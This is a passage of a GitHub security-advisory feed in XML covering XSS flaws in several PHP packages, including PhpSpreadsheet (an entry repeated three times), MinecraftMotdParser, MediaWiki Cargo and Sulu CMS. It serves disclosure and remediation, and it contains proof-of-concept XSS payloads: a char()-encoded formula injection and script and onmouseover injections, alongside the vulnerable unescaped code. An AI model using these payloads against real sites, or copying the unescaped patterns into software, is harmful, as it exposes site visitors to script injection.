<p>The review process concluded the same day at night, which revealed the issue was also present in paragraph widget. This was fixed the same day and dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a> followed.</p>
<h2 id="note">Note:</h2>
<p>if you're published the view (blade files), you have to republish them or check the changes on release to update the affected file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
<li><a href="https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c">https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c</a></li>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a">https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a</a></li>
<li><a href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:55:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mediawiki/cargo] Mediawiki Cargo extension vulnerable to Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-jqvm-9xm2-gc38</id>
        <link href="https://github.com/advisories/GHSA-jqvm-9xm2-gc38"/>
        <updated>2024-10-07T14:50:53.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in The Wikimedia Foundation Mediawiki - Cargo allows Cross-Site Scripting (XSS).This issue affects Mediawiki - Cargo: from 3.6.X before 3.6.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47847">https://nvd.nist.gov/vuln/detail/CVE-2024-47847</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063804">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063804</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063806">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063806</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063827">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063827</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063831">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063831</a></li>
<li><a href="https://phabricator.wikimedia.org/T368628">https://phabricator.wikimedia.org/T368628</a></li>
<li><a href="https://phabricator.wikimedia.org/T372211">https://phabricator.wikimedia.org/T372211</a></li>
<li><a href="https://github.com/advisories/GHSA-jqvm-9xm2-gc38">https://github.com/advisories/GHSA-jqvm-9xm2-gc38</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jqvm-9xm2-gc38</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-05T03:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has an Unauthenticated Cross-Site-Scripting (XSS) in sample file]]></title>
        <id>https://github.com/advisories/GHSA-v66g-p9x6-v98p</id>
        <link href="https://github.com/advisories/GHSA-v66g-p9x6-v98p"/>
        <updated>2024-10-07T14:43:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>One of the sample scripts in PhpSpreadsheet is susceptible to a cross-site scripting (XSS) vulnerability due to improper handling of input where a number is expected leading to formula injection.</p>
<h3 id="details">Details</h3>
<p>The following <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">code</a> in <code>45_Quadratic_equation_solver.php</code> concatenates the user supplied parameters directly into spreadsheet formulas. This allows an attacker to take control over the formula and output unsanitized data into the page, resulting in JavaScript execution.</p>
<pre><code>$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';
$discriminant = Calculation::getInstance()-&gt;calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Access <code>45_Quadratic_equation_solver.php</code> in a browser</li>
<li>Enter any valid values for for <code>b</code> and <code>c</code>, and enter the following for <code>a</code></li>
</ol>
<pre><code>1) &amp; ("1)),1)&amp;char(60)&amp;char(105)&amp;char(109)&amp;char(103)&amp;char(32)&amp;char(115)&amp;char(114)&amp;char(99)&amp;char(61)&amp;char(120)&amp;char(32)&amp;char(111)&amp;char(110)&amp;char(101)&amp;char(114)&amp;char(114)&amp;char(111)&amp;char(114)&amp;char(61)&amp;char(97)&amp;char(108)&amp;char(101)&amp;char(114)&amp;char(116)&amp;char(40)&amp;char(41)&amp;char(62)&amp;POWER(((1") &amp;n("1")&amp;(1
</code></pre>
<ol start="3">
<li>Press submit and observe that JavaScript is executed.</li>
</ol>
<p><img alt="exploit-phpspreadsheet" src="https://user-images.githubusercontent.com/1211162/297062610-0cdb26d1-2b47-46e2-bd31-189b0694186d.png"></p>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability on the project is expected to be relatively low since these are sample files that should not be included when the library is used properly (e.g., through composer). However, at least two instances of popular WordPress plugins have unintentionally exposed this file by including the entire git repository. Since these files also serve as reference points for developers using the library, addressing this issue can enhance security for users.</p>
<p>A solution to fix the vulnerability is proposed below, and a request for a CVE assignment has been made to facilitate responsible disclosure of the security issue to the affected WordPress plugins.</p>
<h3 id="remediation">Remediation</h3>
<p>A quick and easy solution to prevent this attack is to force the parameters to be numerical values:</p>
<pre><code class="language-php">if (isset($_POST['submit'])) {
    $_POST['A'] = floatval($_POST['A']);
    $_POST['B'] = floatval($_POST['B']);
    $_POST['C'] = floatval($_POST['C']);
    if ($_POST['A'] == 0) {
</code></pre>
<p>Thank you for your time!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007">https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759">https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747">https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747</a></li>
<li><a href="https://github.com/advisories/GHSA-v66g-p9x6-v98p">https://github.com/advisories/GHSA-v66g-p9x6-v98p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66g-p9x6-v98p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:43:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has an Unauthenticated Cross-Site-Scripting (XSS) in sample file]]></title>
        <id>https://github.com/advisories/GHSA-v66g-p9x6-v98p</id>
        <link href="https://github.com/advisories/GHSA-v66g-p9x6-v98p"/>
        <updated>2024-10-07T14:43:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>One of the sample scripts in PhpSpreadsheet is susceptible to a cross-site scripting (XSS) vulnerability due to improper handling of input where a number is expected leading to formula injection.</p>
<h3 id="details">Details</h3>
<p>The following <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">code</a> in <code>45_Quadratic_equation_solver.php</code> concatenates the user supplied parameters directly into spreadsheet formulas. This allows an attacker to take control over the formula and output unsanitized data into the page, resulting in JavaScript execution.</p>
<pre><code>$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';
$discriminant = Calculation::getInstance()-&gt;calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Access <code>45_Quadratic_equation_solver.php</code> in a browser</li>
<li>Enter any valid values for for <code>b</code> and <code>c</code>, and enter the following for <code>a</code></li>
</ol>
<pre><code>1) &amp; ("1)),1)&amp;char(60)&amp;char(105)&amp;char(109)&amp;char(103)&amp;char(32)&amp;char(115)&amp;char(114)&amp;char(99)&amp;char(61)&amp;char(120)&amp;char(32)&amp;char(111)&amp;char(110)&amp;char(101)&amp;char(114)&amp;char(114)&amp;char(111)&amp;char(114)&amp;char(61)&amp;char(97)&amp;char(108)&amp;char(101)&amp;char(114)&amp;char(116)&amp;char(40)&amp;char(41)&amp;char(62)&amp;POWER(((1") &amp;n("1")&amp;(1
</code></pre>
<ol start="3">
<li>Press submit and observe that JavaScript is executed.</li>
</ol>
<p><img alt="exploit-phpspreadsheet" src="https://user-images.githubusercontent.com/1211162/297062610-0cdb26d1-2b47-46e2-bd31-189b0694186d.png"></p>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability on the project is expected to be relatively low since these are sample files that should not be included when the library is used properly (e.g., through composer). However, at least two instances of popular WordPress plugins have unintentionally exposed this file by including the entire git repository. Since these files also serve as reference points for developers using the library, addressing this issue can enhance security for users.</p>
<p>A solution to fix the vulnerability is proposed below, and a request for a CVE assignment has been made to facilitate responsible disclosure of the security issue to the affected WordPress plugins.</p>
<h3 id="remediation">Remediation</h3>
<p>A quick and easy solution to prevent this attack is to force the parameters to be numerical values:</p>
<pre><code class="language-php">if (isset($_POST['submit'])) {
    $_POST['A'] = floatval($_POST['A']);
    $_POST['B'] = floatval($_POST['B']);
    $_POST['C'] = floatval($_POST['C']);
    if ($_POST['A'] == 0) {
</code></pre>
<p>Thank you for your time!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007">https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759">https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747">https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747</a></li>
<li><a href="https://github.com/advisories/GHSA-v66g-p9x6-v98p">https://github.com/advisories/GHSA-v66g-p9x6-v98p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66g-p9x6-v98p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:43:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has an Unauthenticated Cross-Site-Scripting (XSS) in sample file]]></title>
        <id>https://github.com/advisories/GHSA-v66g-p9x6-v98p</id>
        <link href="https://github.com/advisories/GHSA-v66g-p9x6-v98p"/>
        <updated>2024-10-07T14:43:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>One of the sample scripts in PhpSpreadsheet is susceptible to a cross-site scripting (XSS) vulnerability due to improper handling of input where a number is expected leading to formula injection.</p>
<h3 id="details">Details</h3>
<p>The following <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">code</a> in <code>45_Quadratic_equation_solver.php</code> concatenates the user supplied parameters directly into spreadsheet formulas. This allows an attacker to take control over the formula and output unsanitized data into the page, resulting in JavaScript execution.</p>
<pre><code>$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';
$discriminant = Calculation::getInstance()-&gt;calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Access <code>45_Quadratic_equation_solver.php</code> in a browser</li>
<li>Enter any valid values for for <code>b</code> and <code>c</code>, and enter the following for <code>a</code></li>
</ol>
<pre><code>1) &amp; ("1)),1)&amp;char(60)&amp;char(105)&amp;char(109)&amp;char(103)&amp;char(32)&amp;char(115)&amp;char(114)&amp;char(99)&amp;char(61)&amp;char(120)&amp;char(32)&amp;char(111)&amp;char(110)&amp;char(101)&amp;char(114)&amp;char(114)&amp;char(111)&amp;char(114)&amp;char(61)&amp;char(97)&amp;char(108)&amp;char(101)&amp;char(114)&amp;char(116)&amp;char(40)&amp;char(41)&amp;char(62)&amp;POWER(((1") &amp;n("1")&amp;(1
</code></pre>
<ol start="3">
<li>Press submit and observe that JavaScript is executed.</li>
</ol>
<p><img alt="exploit-phpspreadsheet" src="https://user-images.githubusercontent.com/1211162/297062610-0cdb26d1-2b47-46e2-bd31-189b0694186d.png"></p>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability on the project is expected to be relatively low since these are sample files that should not be included when the library is used properly (e.g., through composer). However, at least two instances of popular WordPress plugins have unintentionally exposed this file by including the entire git repository. Since these files also serve as reference points for developers using the library, addressing this issue can enhance security for users.</p>
<p>A solution to fix the vulnerability is proposed below, and a request for a CVE assignment has been made to facilitate responsible disclosure of the security issue to the affected WordPress plugins.</p>
<h3 id="remediation">Remediation</h3>
<p>A quick and easy solution to prevent this attack is to force the parameters to be numerical values:</p>
<pre><code class="language-php">if (isset($_POST['submit'])) {
    $_POST['A'] = floatval($_POST['A']);
    $_POST['B'] = floatval($_POST['B']);
    $_POST['C'] = floatval($_POST['C']);
    if ($_POST['A'] == 0) {
</code></pre>
<p>Thank you for your time!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007">https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759">https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747">https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747</a></li>
<li><a href="https://github.com/advisories/GHSA-v66g-p9x6-v98p">https://github.com/advisories/GHSA-v66g-p9x6-v98p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66g-p9x6-v98p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:43:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dev-lancer/minecraft-motd-parser] Minecraft MOTD Parser's HtmlGenerator vulnerable to XSS]]></title>
        <id>https://github.com/advisories/GHSA-q898-frwq-f3qp</id>
        <link href="https://github.com/advisories/GHSA-q898-frwq-f3qp"/>
        <updated>2024-10-04T18:51:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>HtmlGenerator</code> class is subject to potential cross-site scripting (XSS) attack through a parsed malformed Minecraft server MOTD.</p>
<h3 id="context">Context</h3>
<p>Minecraft server owners can set a so-called MOTD (Message of the Day) for their server that appears next to the server icon and below the server name on the multiplayer server list of a player's Minecraft client. The Minecraft server sends the MOTD in the <code>description</code> property of the <a href="https://wiki.vg/Server_List_Ping#Status_Response">Status Response</a> packet. The <a href="https://github.com/jgniecki/MinecraftMotdParser">jgniecki/MinecraftMotdParser</a> PHP library is able to parse the value of the <code>description</code> property, which can be either a string or an array of text components. By utilizing the aforementioned <code>HtmlGenerator</code> class, it is also able to transform the value into an HTML string that can be used to visualize the MOTD on a web page.</p>
<h3 id="details">Details</h3>
<p>The <code>HtmlGenerator</code> iterates through objects of <code>MotdItem</code> that are contained in an object of <code>MotdItemCollection</code> to generate a HTML string. An attacker can make malicious inputs to the <code>color</code> and <code>text</code> properties of <code>MotdItem</code> to inject own HTML into a web page during web page generation. For example by sending a malicious MOTD from a Minecraft server under their control that was queried and passed to the <code>HtmlGenerator</code>.</p>
<p>This XSS vulnerability exists because the values of these properties are neither filtered nor escaped, as can be seen here:</p>
<ul>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80</a></li>
</ul>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>JavaScript code can be injected into the <code>HtmlGenerator</code> by parsing either a string via <code>TextParser</code> or an array via <code>ArrayParser</code>. The following code examples demonstrate the vulnerability by triggering the alert dialog of the browser.</p>
<h4 id="xss-via-textparser">XSS via <code>TextParser</code></h4>
<pre><code class="language-php">&lt;?php

use DevLancer\MinecraftMotdParser\Collection\MotdItemCollection;
use DevLancer\MinecraftMotdParser\Generator\HtmlGenerator;
use DevLancer\MinecraftMotdParser\Parser\TextParser;

$motdCollection = (new TextParser())-&gt;parse('&lt;script&gt;alert("XSS on page load")&lt;/script&gt;', new MotdItemCollection());

echo (new HtmlGenerator())-&gt;generate($motdCollection);
</code></pre>
<h4 id="xss-via-arrayparser">XSS via <code>ArrayParser</code></h4>
<pre><code class="language-php">&lt;?php

use DevLancer\MinecraftMotdParser\Collection\MotdItemCollection;
use DevLancer\MinecraftMotdParser\Generator\HtmlGenerator;
use DevLancer\MinecraftMotdParser\Parser\ArrayParser;

$motdCollection = (new ArrayParser())-&gt;parse([
    [
        'color' =&gt; '#" onmouseover="javascript:alert(\'XSS when mouse pointer enters the span element\')"',
        'text' =&gt; 'Hover me',
    ],
    [
        'color' =&gt; '#000000',
        'text' =&gt; '&lt;script&gt;alert("XSS on page load")&lt;/script&gt;',
    ]
], new MotdItemCollection());

echo (new HtmlGenerator())-&gt;generate($motdCollection);
</code></pre>
<h3 id="impact">Impact</h3>
<p>If the <code>HtmlGenerator</code> class of this library is used, this XSS vulnerability can potentially affect:</p>
<ul>
<li>Players visiting Minecraft server list websites (of which there are several dozen online, written in PHP) that display the MOTD.</li>
<li>Users visiting Minecraft server status websites to query information about a Minecraft server.</li>
<li>Server owners managing their Minecraft server via a web interface that displays the MOTD, where the attack could be carried out by a malicious Minecraft server plugin that modifies the MOTD without the server owner's consent.</li>
</ul>
<p>It is not clear if and which platforms depend on this library.</p>
<h3 id="remediation">Remediation</h3>
<p>I suggest converting all HTML special characters in the values of the <code>color</code> and <code>text</code> properties to HTML entities. The display of the HTML entities will still be correct in the browser, but the XSS vulnerability will be eliminated as the values will no longer be interpreted as HTML by the browser.</p>
<p>This could be achieved by introducing a new private <code>escape</code> function in the <code>HtmlGenerator</code> class:</p>
<pre><code class="language-php">private function escape(string $text): string
{
    return htmlentities($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
</code></pre>
<p>This function should be called in the following two lines:</p>
<ul>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49</a>
Change to: <code>$tags['span'][] = sprintf('color: %s;', $this-&gt;escape($motdItem-&gt;getColor()));</code></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80</a>
Change to: <code>$value = sprintf($value, $this-&gt;escape($motdItem-&gt;getText()));</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/security/advisories/GHSA-q898-frwq-f3qp">https://github.com/jgniecki/MinecraftMotdParser/security/advisories/GHSA-q898-frwq-f3qp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47765">https://nvd.nist.gov/vuln/detail/CVE-2024-47765</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/commit/b0ab9d68a964cd3d74977f39a9e7af0a94509f7c">https://github.com/jgniecki/MinecraftMotdParser/commit/b0ab9d68a964cd3d74977f39a9e7af0a94509f7c</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L49</a></li>
<li><a href="https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80">https://github.com/jgniecki/MinecraftMotdParser/blob/0412f68eeb91729a00444a8d6c00c45623884aa5/src/Generator/HtmlGenerator.php#L80</a></li>
<li><a href="https://github.com/advisories/GHSA-q898-frwq-f3qp">https://github.com/advisories/GHSA-q898-frwq-f3qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q898-frwq-f3qp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-04T18:51:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sulu/sulu] Injection of arbitrary HTML/JavaScript code through the media download URL]]></title>
        <id>https://github.com/advisories/GHSA-6784-9c82-vr85</id>
        <link href="https://github.com/advisories/GHSA-6784-9c82-vr85"/>
        <updated>2024-10-03T18:26:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to inject arbitrary HTML/JavaScript code through the media download URL in Sulu CMS. It affects the SuluMediaBundle component. The vulnerability is a Reflected Cross-Site Scripting (XSS) issue, which could potentially allow attackers to steal sensitive information, manipulate the website's content, or perform actions on behalf of the victim.</p>
<h3 id="patches">Patches</h3>
<p>The problem has not been patched yet. Users should upgrade to patched versions once they become available. Currently affected versions are:</p>
<ul>
<li>2.6.4</li>
<li>2.5.20</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Until an official patch is released, users can implement additional input validation and output encoding for the 'slug' parameter in the MediaStreamController's downloadAction method. Alternatively, configuring a Web Application Firewall (WAF) to filter potentially malicious input could serve as a temporary mitigation.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub repository: <a href="https://github.com/sulu/sulu">https://github.com/sulu/sulu</a></li>
<li>Vulnerable code: <a href="https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106">https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sulu/sulu/security/advisories/GHSA-6784-9c82-vr85">https://github.com/sulu/sulu/security/advisories/GHSA-6784-9c82-vr85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47617">https://nvd.nist.gov/vuln/detail/CVE-2024-47617</a></li>
<li><a href="https://github.com/sulu/sulu/commit/a5a5ae555d282e88ff8559d38cfb46dea7939bda">https://github.com/sulu/sulu/commit/a5a5ae555d282e88ff8559d38cfb46dea7939bda</a></li>
<li><a href="https://github.com/sulu/sulu/commit/eeacd14b6cf55f710084788140d40ebb00314b29">https://github.com/sulu/sulu/commit/eeacd14b6cf55f710084788140d40ebb00314b29</a></li>
<li><a href="https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106">https://github.com/sulu/sulu/blob/2.6/src/Sulu/Bundle/MediaBundle/Controller/MediaStreamController.php#L106</a></li>
<li><a href="https://github.com/advisories/GHSA-6784-9c82-vr85">https://github.com/advisories/GHSA-6784-9c82-vr85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6784-9c82-vr85</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T18:26:26.000Z</published>
    </entry>
</feed>